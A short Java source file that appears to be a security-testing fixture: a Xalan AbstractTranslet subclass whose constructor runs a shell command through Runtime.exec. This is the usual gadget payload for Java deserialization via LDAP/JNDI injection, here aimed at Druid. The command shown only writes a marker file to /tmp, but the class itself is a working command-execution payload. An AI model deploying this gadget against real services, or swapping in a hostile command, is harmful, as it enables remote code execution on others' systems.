import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

// Independent, fixed harmless marker for the native LDAP deserialization gate.
public class NativeTranslet extends AbstractTranslet {
    public NativeTranslet() throws Exception {
        Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", "printf '%s' 'Native LDAP: Druid deserialization' > /tmp/module-target-druid-native-ldap"}).waitFor();
    }

    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {}
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {}
}
